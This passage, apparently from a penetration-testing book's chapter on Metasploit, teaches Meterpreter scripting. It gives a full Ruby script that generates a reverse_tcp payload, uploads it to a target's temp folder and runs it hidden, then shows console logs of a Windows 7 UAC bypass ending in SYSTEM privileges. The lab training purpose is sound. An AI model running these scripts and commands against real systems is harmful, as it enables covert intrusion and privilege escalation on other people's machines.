rport    = 4444
lhost    = "127.0.0.1"
pay      = nil

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
        case opt
        when "-h"
                print_line(info)
                print_line(opts.usage)
                raise Rex::Script::Completed

        when "-r"
                rhost = val<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
        when "-p"
                rport = val.to_i<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>

        end

end</pre><p class="calibre2">Notice that we broke out each argument and assigned values or print information back to the user. The <code class="literal">rhost = val</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19166" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> means “take the value presented from the user when <code class="literal">-r</code> was input.” The <code class="literal">rport = val.to_i</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19178" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> simply assigns the value as an integer (it will always need to be an integer for a port number).</p><p class="calibre2">In the next series, we define everything we need to create our payload:</p><a id="I_programlisting16_d1e19186" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> payload = "windows/meterpreter/reverse_tcp"
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> pay = client.framework.payloads.create(payload)
  pay.datastore['LHOST'] = rhost
  pay.datastore['LPORT'] = rport
  mul = client.framework.exploits.create("multi/handler")
  mul.share_datastore(pay.datastore)
  mul.datastore['WORKSPACE'] = client.workspace
  mul.datastore['PAYLOAD'] = payload
  mul.datastore['EXITFUNC'] = 'process'
  mul.datastore['ExitOnSession'] = true
  mul.exploit_simple(
  'Payload'  =&gt; mul.datastore['PAYLOAD'],
  'RunAsJob' =&gt; true
   )</pre><p class="calibre2">We define our payload as a <code class="literal">windows/meterpreter/reverse_tcp</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19204" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, generate the payload calling the <code class="literal">client.framework.payloads.create(payload)</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19213" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, and specify the necessary parameters to create the multi-handler. These are all the required fields we need to set our payload using the <code class="literal">LHOST</code> and <code class="literal">LPORT</code> options and create a listener.<a id="IDX-CHP-16-0058" class="strong"/><a id="IDX-CHP-16-0059" class="strong"/><a id="IDX-CHP-16-0060" class="strong"/><a id="IDX-CHP-16-0061" class="strong"/><a id="IDX-CHP-16-0062" class="strong"/></p><p class="calibre2">Next we create our executable (<span class="strong"><em class="calibre4">win32pe meterpreter</em></span>), upload it to our target machine, and execute it:</p><a id="I_programlisting16_d1e19247" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> if client.platform =˜ /win32|win64/

        <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>tempdir = client.fs.file.expand_path("%TEMP%")
          print_status("Uploading meterpreter to temp directory...")
          raw = pay.generate
        <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
          tempexe = tempdir + "\\" + filename
          tempexe.gsub!("\\\\", "\\")
          fd = client.fs.file.new(tempexe, "wb")
          fd.write(exe)
          fd.close
          print_status("Executing the payload on the system...")
          execute_payload = "#{tempdir}\\#{filename}"
         pid = session.sys.process.execute(execute_payload, nil, {'Hidden' =&gt; true})

  end</pre><p class="calibre2">The variables called <code class="literal">#{</code><em class="calibre4"><code class="calibre9">something</code></em><code class="literal">}</code> have already been defined within the script and will be called later. Notice that we already defined <code class="literal">tempdir</code> and <code class="literal">filename</code>. Moving into the script, we first include an if statement to detect whether the platform we are targeting is a Windows-based system <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19281" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>; otherwise, the attack won’t run. We then expand the temp directory <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19288" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> on the target machine; this would be the equivalent of <span class="strong"><em class="calibre4">%TEMP%</em></span>. Next we create a new file on the system and write out the new <span class="strong"><em class="calibre4">EXE</em></span> we just generated from the <code class="literal">::Msf::Util::EXE.to_win32pe</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject16_d1e19303" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> call. Remember that we set the <code class="literal">session.sys.process.execute</code> to <code class="literal">Hidden</code> so that the target user won’t see anything pop up on his side.</p><p class="calibre2">Putting this all together, our final script should look something like this:</p><a id="I_programlisting16_d1e19318" class="strong"/><pre class="programlisting"># Meterpreter script for uploading and executing another meterpreter exe

info = "Simple script for uploading and executing an additional meterpreter payload"

#
# Options
#

opts = Rex::Parser::Arguments.new(
       "-h"  =&gt; [ false,   "This help menu. Spawn a
 meterpreter shell by uploading and             executing."],
       "-r"  =&gt; [ true,    "The IP of a remote Metasploit
 listening for the connect back"],
       "-p"  =&gt; [ true,    "The port on the remote host where
 Metasploit is listening             (default: 4444)"]
)

#
# Default parameters
#

filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4444
lhost    = "127.0.0.1"
pay      = nil

#
# Option parsing
#

opts.parse(args) do |opt, idx, val|
       case opt
       when "-h"
              print_line(info)
              print_line(opts.usage)
              raise Rex::Script::Completed

       when "-r"
              rhost = val
       when "-p"
              rport = val.to_i

       end

end

       payload = "windows/meterpreter/reverse_tcp"
       pay = client.framework.payloads.create(payload)
       pay.datastore['LHOST'] = rhost
       pay.datastore['LPORT'] = rport
       mul = client.framework.exploits.create("multi/handler")
       mul.share_datastore(pay.datastore)
       mul.datastore['WORKSPACE'] = client.workspace
       mul.datastore['PAYLOAD'] = payload
       mul.datastore['EXITFUNC'] = 'process'
       mul.datastore['ExitOnSession'] = true
       print_status("Running payload handler")
       mul.exploit_simple(
              'Payload'  =&gt; mul.datastore['PAYLOAD'],
              'RunAsJob' =&gt; true
       )

if client.platform =˜ /win32|win64/

       tempdir = client.fs.file.expand_path("%TEMP%")
       print_status("Uploading meterpreter to temp directory")
        raw = pay.generate
        exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
       tempexe = tempdir + "\\" + filename
        tempexe.gsub!("\\\\", "\\")
       fd = client.fs.file.new(tempexe, "wb")
       fd.write(exe)
       fd.close
       print_status("Executing the payload on the system")
       execute_payload = "#{tempdir}\\#{filename}"
       pid = session.sys.process.execute(execute_payload, nil, {'Hidden' =&gt; true})

end</pre><p class="calibre2">Now that we have our newly created Meterpreter script, let’s launch Metasploit, get into Meterpreter, and execute the script:<a id="IDX-CHP-16-0063" class="strong"/><a id="IDX-CHP-16-0064" class="strong"/><a id="IDX-CHP-16-0065" class="strong"/><a id="IDX-CHP-16-0066" class="strong"/><a id="IDX-CHP-16-0067" class="strong"/></p><a id="I_programlisting16_d1e19337" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run execute_upload -r 172.16.32.129 -p 443</code></strong>
[*] Running payload handler
[*] Uploading meterpreter to temp directory
[*] Executing the payload on the system
[*] Sending stage (749056 bytes) to 172.16.32.170
[*] Meterpreter session 2 opened (172.16.32.129:443 -&gt; 172.16.32.170:1140) at
      Tue Nov 30 23:24:19 −0500 2010
meterpreter &gt;</pre><p class="calibre2">Success! We have created a Meterpreter script and successfully executed it to spawn a new Meterpreter shell. This is a small example of the power and flexibility of the Meterpreter scripting language and Ruby in general.</p><p class="calibre2">One important element to discuss briefly (as mentioned earlier) is the move to convert Meterpreter scripts to a format similar to the Metasploit modules. We’ll use a small demo of a module built for bypassing the Windows 7 UAC. Windows Vista and later introduced a feature similar to <code class="literal">sudo</code> in UNIX- and Linux-based systems. With this feature, a user is assigned limited account permissions until administrative-level permissions are necessary. When the user needs admin rights to perform a task, a prompt appears, telling the user that admin rights are required and are being used. The ultimate goal of this feature is to protect against a compromise or virus infection and to limit exposure only to one user account.</p><p class="calibre2">In December 2010, Dave Kennedy and Kevin Mitnick released a new Meterpreter module that bypassed the Windows UAC component by injecting a payload into a process that had a trusted publisher certificate and was considered “UAC Safe.” When injecting into the process, a DLL can be called, running under the context of that UAC Safe process, which then executes commands.<a id="IDX-CHP-16-0068" class="strong"/></p><p class="calibre2">In this example, we use the post exploitation modules, which can be used to bypass UAC. We first start the <span class="strong"><em class="calibre4">multi/handler</em></span> module with the <code class="literal">-j</code> flag, which allows us to accept multiple Meterpreter shells. Notice in this example that when we try to run the <code class="literal">getsystem</code> command, it fails because it is being blocked by Windows UAC.<a id="IDX-CHP-16-0069" class="strong"/><a id="IDX-CHP-16-0070" class="strong"/><a id="IDX-CHP-16-0071" class="strong"/><a id="IDX-CHP-16-0072" class="strong"/><a id="IDX-CHP-16-0073" class="strong"/></p><a id="I_programlisting16_d1e19381" class="strong"/><pre class="programlisting">resource (src/program_junk/meta_config)&gt; exploit -j
[*] Exploit running as background job.
msf exploit(handler) &gt;
[*] Started reverse handler on 0.0.0.0:443
[*] Starting the payload handler...
[*] Sending stage (749056 bytes) to 172.16.32.130
[*] Meterpreter session 1 opened (172.16.32.128:443 -&gt;
 172.16.32.130:2310) at      Thu June 09 08:02:45 −0500 2011
msf exploit(handler) &gt; sessions -i 1
[*] Starting interaction with 1...
meterpreter &gt; getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
meterpreter &gt; sysinfo
Computer: DAVE-DEV-PC
OS      : Windows 7 (Build 7600).
Arch    : x64 (Current Process is WOW64)
Language: en_US
meterpreter &gt;</pre><p class="calibre2">Notice that we can’t bridge over to a system-level account, because UAC is blocking us. We need to get around UAC to obtain system-level privileges and ultimately become an administrator so that we can further compromise the machine. We press <span class="keycap">ctrl</span>-Z to back out, keeping the session active. Then we use the new format to run post modules and bypass the Windows UAC functionality.</p><a id="I_programlisting16_d1e19389" class="strong"/><pre class="programlisting">msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">use post/windows/escalate/bypassuac</code></strong>
msf post(bypassuac) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>
Module options (post/windows/escalate/bypassuac):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   LHOST                     no        Listener IP address for the new session
   LPORT    4444             no        Listener port for the new session
   SESSION                   yes       The session to run this module on.

msf post(bypassuac) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 172.16.32.128</code></strong>
LHOST =&gt; 172.16.32.128
msf post(bypassuac) &gt; <strong class="calibre3"><code class="calibre6">set SESSION 1</code></strong>
SESSION =&gt; 1
msf post(bypassuac) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Started reverse handler on 172.16.32.128:4444
[*] Starting the payload handler...
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Uploaded the agent to the filesystem....
[*] Post module execution completed
msf post(bypassuac) &gt;
[*] Sending stage (749056 bytes) to 172.16.32.130
[*] Meterpreter session 2 opened (172.16.32.128:4444 -&gt;
 172.16.32.130:1106) at Thu June 09
     19:50:54 −0500 2011
[*] Session ID 2 (172.16.32.128:4444 -&gt; 172.16.32.130:1106)
 processing InitialAutoRunScript
     'migrate -f'
[*] Current server process: tYNpQMP.exe (3716)
[*] Spawning a notepad.exe host process...
[*] Migrating into process ID 3812
[*] New server process: notepad.exe (3812)

msf post(bypassuac) &gt; <strong class="calibre3"><code class="calibre6">sessions -i 2</code></strong>
[*] Starting interaction with 2...

meterpreter &gt; <strong class="calibre3"><code class="calibre6">getsystem</code></strong>
...got system (via technique 1).
meterpreter &gt;</pre><p class="calibre2">We could also have executed <code class="literal">run</code> instead of <code class="literal">use</code> within the Meterpreter console and it would have leveraged the default options and executed without having to set up the various options.</p><p class="calibre2">Notice in the preceding example that we succeed in gaining system-level rights on a target machine with UAC enabled. This small example demonstrates how the post exploitation modules will ultimately be set up and converted.</p><p class="calibre2">This script works simply by uploading a previously compiled executable to the target machine and then running it. Take a look at the post exploitation module for a better idea of what’s going on behind the scenes:</p><a id="I_programlisting16_d1e19425" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# nano modules/post/windows/escalate/bypassuac.rb</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="wrapping_up-id7">Wrapping Up</h2></div></div></div><p class="calibre2">We won’t cover all the details of the post exploitation module because it is nearly identical to the attack shown in <a class="xref" href="part0017.html#building_your_own_module">Chapter 13</a>. Carefully walk through each line, and then try to build and run your own module.</p><p class="calibre2">Walk through existing Meterpreter scripts and look at the different commands, calls, and functions that can be used to create your own script. If you come up with a great idea for a new script, submit it to the Metasploit development team — who knows; it might be a script that others can use!</p></div></section></body></html>